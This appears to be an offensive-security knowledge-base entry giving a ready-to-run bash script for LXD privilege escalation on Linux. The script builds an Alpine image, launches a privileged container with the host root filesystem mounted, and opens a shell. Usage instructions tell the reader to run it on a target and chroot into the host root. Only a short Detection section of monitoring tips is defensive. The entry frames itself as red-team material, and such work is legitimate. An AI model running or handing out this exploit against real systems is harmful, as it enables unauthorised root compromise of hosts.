---
type: code
language: bash
verified: true
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
tags:
  - privilege-escalation
  - lxd
  - script
validated: true
---

# LXD-Alpine-Privilege-Escalation-Script

## Code

```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine -a i686

# import the image
lxc image import ./alpine.tar.gz --alias myimage

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

## Description

This bash script automates the process of building an Alpine image, importing it into LXD, creating a privileged container, mounting the host root filesystem, and providing an interactive shell for privilege escalation. It exploits LXD's privileged mode to allow root access on the host from within the container.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| myimage | Alias for the imported image | alpine-priv-esc |
| mycontainer | Name of the container | priv-esc-container |
| mydevice | Name of the disk device | root-mount |
| /mnt/root | Mount path inside container | /host-root |

## Usage

Save as a .sh file, make executable (`chmod +x script.sh`), and run on a target Linux system with LXD access. After execution, in the container shell, use `chroot /mnt/root` to access host root. Ideal for red team exercises simulating container escape.

## Detection

- Monitor LXD logs for image imports from untrusted sources or privileged container inits (`journalctl -u lxd`).
- Audit `lxc config device add` commands for root mounts.
- Detect unusual git clones of builder repos or build-alpine executions via process monitoring (e.g., auditd rules on git/lxc).
- Network indicators: GitHub clones; file indicators: alpine.tar.gz artifacts.

## Related

- [[procedures/Linux-Privilege-Escalation-via-LXC-LXD-Alpine-Image]]
